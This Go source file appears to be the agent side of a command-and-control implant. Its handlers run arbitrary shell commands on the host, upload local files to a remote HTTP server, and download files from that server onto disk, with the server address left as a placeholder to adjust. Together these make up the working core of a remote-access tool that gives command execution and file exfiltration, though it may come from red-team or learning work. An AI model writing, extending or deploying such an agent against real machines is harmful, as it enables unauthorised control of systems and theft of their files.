package agent

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func handlePing(args []string) (string, error) {
	return "pong", nil
}

func handleNOP(args []string) (string, error) {
	return "NOP", nil
}

func handleChangeDir(args []string) (string, error) {
	if len(args) < 1 {
		return "", fmt.Errorf("no directory specified")
	}
	return ChangeDir(args[0])
}

func handleDownloadFile(args []string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("usage: download <remote_file_name> <local_file_path>")
	}

	return DownloadFile(args[0], args[1])
}

func handleUploadFile(args []string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("usage: upload <local_file_path> <remote_file_name>")
	}
	return UploadFile(args[0], args[1])
}

func handleShellExec(args []string) (string, error) {
	return RunShellCommand(args[0], args[1:])
}

func handleExit(args []string) (string, error) {
	return "not implemented", nil
}

func ChangeDir(path string) (string, error) {
	// Use os.Chdir to change directories
	err := os.Chdir(path)
	if err != nil {
		return "", fmt.Errorf("failed to change directory: %v", err)
	}
	return "Directory changed successfully\n", nil
}

func RunShellCommand(command string, args []string) (string, error) {
	// TODO: how will this behave on windows platform with for example powershell?
	// Create a context with a timeout (e.g., 5 seconds)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	// Execute the command with the given context (to allow for a timeout)
	cmd := exec.CommandContext(ctx, command, args...)

	// Capture the standard output and error
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Start the command
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start command: %v", err)
	}

	// Wait for the command to finish or timeout
	err := cmd.Wait()

	// If the context's deadline was exceeded (i.e., a timeout occurred)
	if ctx.Err() == context.DeadlineExceeded {
		return "", fmt.Errorf("command timed out")
	}

	// If there was an error, return the error message and stderr
	if err != nil {
		return fmt.Sprintf("Command error: %v\nStderr: %s", err, stderr.String()), err
	}

	// Return the output, or a default success message if there’s no output
	if stdout.Len() == 0 && stderr.Len() == 0 {
		return "Command executed successfully (no output)\n", nil
	}

	return stdout.String(), nil
}

// UploadFile uploads a file to the HTTP file server
func UploadFile(localFilePath string, remoteFileName string) (string, error) {
	file, err := os.Open(localFilePath)
	if err != nil {
		return "", fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	// Create a POST request to upload the file
	url := fmt.Sprintf("http://%s:%s/upload", "0.0.0.0", "8080") // adjust IP/Port as needed
	req, err := http.NewRequest("POST", url, file)
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("File-Name", remoteFileName)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to upload file: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("upload failed with status: %v", resp.Status)
	}

	return fmt.Sprintf("File uploaded successfully as %s", remoteFileName), nil
}

func DownloadFile(remoteFileName string, localFilePath string) (string, error) {
	url := fmt.Sprintf("http://%s:%s/download?file=%s", "0.0.0.0", "8080", remoteFileName) // adjust IP/Port as needed

	// fmt.Printf("Downloading from URL: %s\n", url)

	resp, err := http.Get(url)
	if err != nil {
		return "", fmt.Errorf("failed to download file: %v", err)
	}
	defer resp.Body.Close()

	// fmt.Printf("HTTP response received. Status: %s\n", resp.Status)

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("download failed with status: %v", resp.Status)
	}

	// Create the local file
	file, err := os.Create(localFilePath)
	if err != nil {
		return "", fmt.Errorf("could not create file: %v", err)
	}
	defer file.Close()

	// fmt.Printf("Created local file: %s\n", localFilePath)

	// Copy the HTTP response body to the local file
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to save file: %v", err)
	}

	// fmt.Printf("File downloaded and saved to: %s\n", localFilePath)

	return fmt.Sprintf("File downloaded successfully to %s", localFilePath), nil
}
